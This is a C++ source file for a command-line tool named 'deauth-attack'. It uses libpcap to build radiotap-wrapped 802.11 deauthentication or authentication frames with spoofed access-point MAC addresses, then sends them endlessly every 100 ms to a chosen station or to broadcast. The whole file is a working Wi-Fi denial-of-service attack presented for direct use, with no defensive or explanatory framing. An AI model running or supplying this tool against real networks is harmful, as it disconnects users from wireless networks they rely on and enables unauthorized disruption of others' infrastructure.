#include <pcap.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>

using namespace std;

// RadioTap Header
uint8_t radiotap_header[] = {
    0x00, 0x00, // <-- radiotap version
    0x0c, 0x00, // <- radiotap header length
    0x04, 0x80, 0x00, 0x00, // <- bitmap
    0x02, // <-- rate
    0x00, // <-- padding for natural alignment
    0x18, 0x00, 0x00, 0x00 // <-- TX flags
};

// Deauthentication Frame
uint8_t deauth_frame[] = {
    0xc0, 0x00, // <-- Frame Control (type=Management, subtype=Deauthentication)
    0x3a, 0x01, // <- Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // <-- Destination Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- Source Address (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- BSSID (AP)
    0x00, 0x00, // <- Sequence Control
    0x07, 0x00  // <-- Reason Code (7 = Class 3 frame received from nonassociated STA)
};

// Authentication Frame
uint8_t auth_frame[] = {
    0xb0, 0x00, // <-- Frame Control (type=Management, subtype=Authentication)
    0x3a, 0x01, // <- Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // <-- Destination Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- Source Address (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <-- BSSID (AP)
    0x00, 0x00, // <- Sequence Control
    0x00, 0x00, // <-- Authentication Algorithm Number (Open System)
    0x01, 0x00, // <-- Authentication Transaction Sequence Number
    0x00, 0x00  // <-- Status Code
};

void set_mac(uint8_t *frame, const char *mac, int offset) {
    sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &frame[offset], &frame[offset + 1], &frame[offset + 2],
        &frame[offset + 3], &frame[offset + 4], &frame[offset + 5]);
}

void create_packet(uint8_t *packet, const uint8_t *frame, size_t frame_size, const char *ap_mac, const char *station_mac, bool is_auth) {
    memcpy(packet, radiotap_header, sizeof(radiotap_header));
    memcpy(packet + sizeof(radiotap_header), frame, frame_size);

    set_mac(packet + sizeof(radiotap_header), station_mac, 4); // Destination Address
    set_mac(packet + sizeof(radiotap_header), ap_mac, 10); // Source Address
    set_mac(packet + sizeof(radiotap_header), ap_mac, 16); // BSSID
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]" << endl;
        cerr << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
        return -1;
    }

    const char *dev = argv[1];
    const char *ap_mac = argv[2];
    const char *station_mac = (argc > 3 && strcmp(argv[3], "-auth") != 0) ? argv[3] : "ff:ff:ff:ff:ff:ff";
    bool is_auth = (argc > 4 && strcmp(argv[4], "-auth") == 0) || (argc == 4 && strcmp(argv[3], "-auth") == 0);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cerr << "Couldn't open device " << dev << ": " << errbuf << endl;
        return -1;
    }

    uint8_t packet[64];
    const uint8_t *frame = is_auth ? auth_frame : deauth_frame;
    size_t frame_size = is_auth ? sizeof(auth_frame) : sizeof(deauth_frame);

    create_packet(packet, frame, frame_size, ap_mac, station_mac, is_auth);

    while (true) {
        if (pcap_sendpacket(handle, packet, sizeof(radiotap_header) + frame_size) != 0) {
            cerr << "Error sending the packet: " << pcap_geterr(handle) << endl;
            return -1;
        }
        usleep(100000); // 100ms 대기
    }

    pcap_close(handle);
    return 0;
}